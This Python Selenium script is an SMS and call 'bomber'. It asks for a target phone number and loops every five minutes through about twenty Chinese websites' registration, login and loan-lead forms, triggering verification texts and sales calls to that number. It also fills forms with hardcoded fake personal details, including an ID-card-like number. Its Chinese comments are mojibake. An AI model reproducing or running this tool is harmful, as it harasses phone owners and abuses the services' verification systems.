# coding=gbk
"""
���ߣ�����
���ںţ���ת������
@ʱ��  : 2022/2/3 0:29
Ⱥ��428335755
"""

from selenium import webdriver
import time


driver = webdriver.Chrome(executable_path=r'C:\Users\hp\Downloads\chromedriver_win32\chromedriver.exe')



class HongZha:

    def __init__(self):
        self.phone = input('��������Ҫ��ը�ĺ��룺')
        self.num = 0

    # ������֤��
    def send_yzm(self,button,name):
        button.click()
        self.num+=1
        print("{}  ��{}��  ���ͳɹ�  {}".format(self.phone,self.num,name))

    # qqע��ӿڣ��������Ժ�����Ҫ�л�ip
    def qq(self,name):
        try:
            driver.get('https://ssl.zc.qq.com/v3/index-chs.html')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//input[@id="nickname"]').send_keys('xxxx')
            driver.find_element_by_xpath('//input[@id="password"]').send_keys('woshinibaba22')
            driver.find_element_by_xpath('//input[@id="phone"]').send_keys(self.phone)
            button = driver.find_element_by_xpath('//a[@id="send-sms"]')
            self.send_yzm(button,name)
        except:
            print('����ʧ��')

    # С��ע��ӿ�
    def xiaomi(self,name):
        try:
            driver.get('https://account.xiaomi.com/pass/register')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//input[@name="phone"]').send_keys(self.phone)
            button = driver.find_element_by_xpath('//input[@type="submit"]')
            self.send_yzm(button,name)
        except:
            print('����ʧ��')


    # ����ע��ӿ�
    def guazi(self,name):
        try:
            driver.implicitly_wait(10)
            driver.get ( "https://www.guazi.com/www/bj/buy" )
            a_btn = driver.find_element_by_xpath ( "//a[@class='uc-my']" )
            a_btn.click ()
            tel = driver.find_element_by_xpath ( "//input[@placeholder='�����������ֻ�����']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath ( "//button[@class='get-code']" )
            self.send_yzm ( button,name )
        except:
            print('����ʧ��')


    # ΨƷ��ע��ӿ�
    def wphui(self,name):
        try:
            driver.get ( "https://passport.vip.com/register?src=https%3A%2F%2Fwww.vip.com%2F" )
            driver.implicitly_wait(10)
            tel = driver.find_element_by_xpath ( "//input[@placeholder='�������ֻ�����']" )
            tel.send_keys ( self.phone )
            driver.find_element_by_xpath ( '//a[contains(./text(),"��ȡ��֤��")]' ).click()
            button = driver.find_element_by_xpath ("//a[@class='ui-btn-medium btn-verify-code ui-btn-secondary']" )
            self.send_yzm ( button,name )
        except:
            print('����ʧ��')


    # ����ע��ӿ�
    def suning(self,name):
        try:
            driver.get ( "https://reg.suning.com/person.do" )
            driver.implicitly_wait(10)
            tel = driver.find_element_by_xpath ( "//input[@id='mobileAlias']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath ("//a[@id='sendSmsCode']" )
            self.send_yzm ( button,name )
        except:
            print('����ʧ��')


    #һ�ŵ�ע��ӿ�
    def yhd(self,name):
        try:
            driver.get ( "https://passport.yhd.com/passport/register_input.do" )
            driver.implicitly_wait(10)
            driver.find_element_by_xpath ( "//input[@id='userName']" ).send_keys("wujunya625")
            tel = driver.find_element_by_xpath ( "//input[@id='phone']" )
            tel.send_keys ( self.phone )
            button = driver.find_element_by_xpath ("//a[contains(./text(),'��ȡ��֤��')]" )
            self.send_yzm ( button,name )
        except:
            print('����ʧ��')


    # ����ע��ӿ�
    def youzan(self,name):
        try:
            driver.get('https://www.youzan.com/v2/account?from_source=baidu_pz_shouye_0&')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//input[@name="mobile"]').send_keys(self.phone)
            button = driver.find_element_by_xpath('//button[contains(./text(),"��ȡ��֤��")]')
            self.send_yzm(button, name)
        except:
            print('����ʧ��')


    # ƴ�����ŵ�½�ӿ�
    def pinduoduo(self,name):
        try:
            driver.get('http://mobile.yangkeduo.com/login.html')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//div[@class="phone-login"]/span').click()
            driver.find_element_by_xpath('//input[@id="user-mobile"]').send_keys(self.phone)
            button=driver.find_element_by_xpath('//button[@id="code-button"]')
            self.send_yzm(button, name)
        except:
            print('����ʧ��')


    # ���ڵ�����½�ӿ�
    def dianping(self,name):
        try:
            driver.get('https://maccount.dianping.com/login')
            driver.implicitly_wait(10)
            driver.find_element_by_xpath('//input[@name="mobile"]').send_keys(self.phone)
            button = driver.find_element_by_xpath('//a[@class="J_send EasyLogin_send"]')
            self.send_yzm(button, name)
        except:
            print('����ʧ��')


    # ֧����ע�������Ͱ�ť�޷��ɹ�
    def zhifubao(self,name):
        driver.get('https://memberprod.alipay.com/account/reg/index.htm')
        driver.implicitly_wait(10)
        iframe = driver.find_element_by_xpath('//iframe')
        driver.switch_to.frame(iframe)
        driver.find_element_by_xpath('//a[@seed="content-JAgreeButton"]').click()
        driver.find_element_by_xpath('//input[@id="J-accName"]').send_keys(self.phone)
        # button = driver.find_element_by_xpath('//button[@seed="JResendMobile-btn"]')
        button = driver.find_element_by_xpath('//button[contains(./text(),"��ȡ��֤��")]')

        for i in range(3):
            button.click()
        self.send_yzm(button, name)

    #ŵ�ǲƸ�
    def nuoyacaifu(self,name):
        driver.get('https://ifaclubstatic.noahgroup.com/baidu/pc2/index.html')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@id="register_name"]').send_keys('У��')
        driver.find_element_by_xpath('//input[@id="register_phone"]').send_keys(self.phone)

        # driver.find_element_by_xpath('//input[@name="mobile"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//button[@id="register_getcode"]')
        self.send_yzm(button, name)

    # ������
    def tangeche(self,name):
        for i in range(3):
            driver.get('https://www.tangeche.com/market')
            time.sleep(0.1)
        # driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@placeholder="�����������ֻ���"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//div[contains(./text(),"��ѯ�����Ż�")]')
        self.send_yzm(button,name)

    # �����ֽ���----���۵绰��ը
    def dazuoshousell(self,name):
        while True:
            try:

                driver.get('http://www.jinrongdazuoshou.com/bdtg/')
                # time.sleep(1)
                # driver.get('h17803403206ttp://www.jinrongdazuoshou.com/bdtg/')
                # driver.implicitly_wait(10)
                driver.find_element_by_xpath('//input[@id="para116"]').send_keys('У��')
                driver.find_element_by_xpath('//input[@name="para117"]').send_keys(self.phone)
                button=driver.find_element_by_xpath('//a[@name="submit"]')
                self.send_yzm(button,name)
                break
            except:
                print('restart.......')

        alert=driver.switch_to_alert()
        alert.accept()


    # ���Ͷ
    def duocaitou(self,name):
        driver.get('https://www.duocaitou.com/login?redirect=%2F')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@placeholder="�������ֻ���"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//button[@class="getCode ivu-btn ivu-btn-text"]')
        self.send_yzm(button,name)


    # ���Ҵ�
    def niwodai(self,name):
        driver.get('http://www.niwodai.com/ad2018.mhtml?artId=5820160000027066&utm_source=Baidu&utm_medium=cpc&cid=Search-PC-bd03-Shanghai-20170411-10001&nwd_ext_aid=3000001481188029&source_id=Search-PC-bd03-Shanghai-20170411-10001')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@name="mobile"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//em[@id="getPhonecode"]')
        self.send_yzm(button,name)

    # ��Ϊ��ע��chromedriver��ʶ��
    def huaweiyun(self,name):
        driver.get('https://reg.huaweicloud.com/registerui/public/custom/register.html#/register')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@id="accountNameId"]').send_keys('xianozhang')
        driver.find_element_by_xpath('//input[@id="passwordId"]').send_keys('nishijiba22')
        driver.find_element_by_xpath('//input[@id="confirmPasswordId"]').send_keys('nishijiba22')
        driver.find_element_by_xpath('//input[@id="phoneId"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//span[contains(./text(),"��ȡ������֤��")]')
        self.send_yzm(button,name)






    # ���˴�chromedriver��ʶ��
    def yirendai(self,name):
        driver.get('https://www.yirencf.com/lp/431/5/')
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//input[@id="mobile"]').send_keys(self.phone)
        driver.find_element_by_xpath('//input[@id="paper"]').click()
        button=driver.find_element_by_xpath('//span[@id="SM_TXT_1"]')
        self.send_yzm(button,name)
        time.sleep(2)

    # ���������������
    def daikuai(self,name):
        # 13636356336
        username = '������'
        idcard = '430581198208082837'
        address = '�Ϻ����ֶ�������˼·'
        driver.get('http://daikuai.lnxhxd.com/')
        driver.find_element_by_xpath('//input[@id="name"]').send_keys(username)
        driver.find_element_by_xpath('//input[@id="idcard"]').send_keys(idcard)
        driver.find_element_by_xpath('//input[@id="tel"]').send_keys(self.phone)
        driver.find_element_by_xpath('//input[@id="address"]').send_keys(address)
        driver.find_element_by_xpath('//select[@id="money"]').click()
        driver.find_element_by_xpath('//option[@value="10��"]').click()
        driver.find_element_by_xpath('//select[@id="qixian"]').click()
        driver.find_element_by_xpath('//option[@value="3��(36��)"]').click()
        driver.find_element_by_xpath('//select[@id="yongtu"]').click()
        driver.find_element_by_xpath('//option[@value="��ҵ����"]').click()
        button = driver.find_element_by_xpath('//button[@name="zntjan"]')
        self.send_yzm(button,name)
        alert=driver.switch_to_alert()
        alert.accept()

    #     ƽ���ô�
    def pinanhaodai(self,name):
        username = '������'
        driver.get('http://haodai.pingan.com/loan/index.html?WT.mc_id=ZTXYD-bdpc-pc1-tyc-821-0051220&WT.srch=1')
        driver.find_element_by_xpath('//input[@id="name"]').send_keys(username)
        driver.find_element_by_xpath('//input[@id="phone"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//div[@id="loan_next"]')
        self.send_yzm(button,name)
        # driver.find_element_by_xpath('//div[@id="curLocationPr"]').click()
        # driver.find_element_by_xpath('//li[@data-value="110000"]').click()
        # driver.find_element_by_xpath('//input[@id="y-m-d"]').click()
        # driver.find_element_by_xpath('//td[@class="Wwday"][1]').click()
        # driver.find_element_by_xpath('//div[@id="btn"]').click()

    # 360����
    def dai360(self,name):
        driver.get('https://cdn-daikuan.360jie.com.cn/dir_mkteditor/activity/qmmx/pc/1.3.0/12m1pcdz.html?utm_term=daikuan&utm_campaign=12mianshouqipc_201708&utm_medium=search1&utm_source=jinyuanbaiducpc360jietiao&utm_content=pinpai-banben')
        driver.find_element_by_xpath('//a[@class="get-btn"]').click()
        driver.switch_to_active_element()

        driver.find_element_by_xpath('//input[@id="mobile"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//a[@class="btnSendCode"]')
        self.send_yzm(button,name)

    # ƴȤ��
    def pinquduo(self,name):
        driver.get('https://wx.pinquduo.cn/login')
        driver.find_element_by_xpath('//input[@type="tel"]').send_keys(self.phone)
        button=driver.find_element_by_xpath('//span[contains(./text(),"��ȡ��֤��")]')
        self.send_yzm(button,name)

    # ƽ�����գ������������
    def pinanhuipu(self,name):
        driver.get('http://paph.adks.cn/page/pc-1011/?utm_source=MKT_baidu_ss&utm_medium=cpc&utm_campaign=Market-c&WT.mc_id=CXX-BD-TY2160129-160413-460&')
        driver.find_element_by_xpath('//input[@name="name"]').send_keys('������')
        driver.find_element_by_xpath('//input[@id="mobile"]').send_keys(self.phone)
        driver.find_element_by_xpath('//input[@id="nextsub"]').click()
        driver.find_element_by_xpath('//dt[contains(./text(),"��ѡ�������")]').click()
        driver.find_element_by_xpath('//a[contains(./text(),"21��������")]').click()
        driver.find_element_by_xpath('//input[@name="isCreditCard" and @value="1"]').click()
        driver.find_element_by_xpath('//input[@name="input_area"]').click()
        driver.find_element_by_xpath('//li[contains(./text(),"��ͨ")]').click()
        driver.find_element_by_xpath('//input[@name="liveTime"]').click()
        driver.find_element_by_xpath('//input[@name="hasHouseLoan"]').click()
        driver.find_element_by_xpath('//input[@name="hasCar"]').click()
        driver.find_element_by_xpath('//input[@name="payCarLoan"]').click()
        driver.find_element_by_xpath('//input[@name="hasLifeInsurance"]').click()
        driver.find_element_by_xpath('//input[@name="lifeInsuranceTotal"]').click()
        driver.find_element_by_xpath('//button[@class="nextStep"]').click()
        self.num+=1
        print("{}  ��{}��  ���ͳɹ�  {}".format(self.phone,self.num,name))



    # ѭ��ִ��
    def main(self):
        while True:
            # �������Ժ���qq�ӿ���Ҫ�л�ip
            self.qq('qq')
            self.xiaomi('С��')
            self.guazi('����')
            self.wphui('ΨƷ��')
            self.suning('����')
            self.yhd('һ�ŵ�')
            self.youzan('����')
            self.pinduoduo('ƴ���')
            self.dianping('���ڵ���')
            self.tangeche('������')
            self.nuoyacaifu('ŵ�ǲƸ�')
            self.dazuoshousell('���ڴ�����')
            self.duocaitou('p2p���Ͷ')
            self.niwodai('���Ҵ�')
            # self.huaweiyun('��Ϊ��')
            # self.yirendai('���˴�')
            self.daikuai('daikuai')
            self.pinanhaodai('ƽ���ô�')
            self.dai360('360����')
            self.pinquduo('ƴȤ��')
            self.pinanhuipu('ƽ������')
            time.sleep(60*5)

if __name__ == '__main__':
    hongzha = HongZha()
    hongzha.main()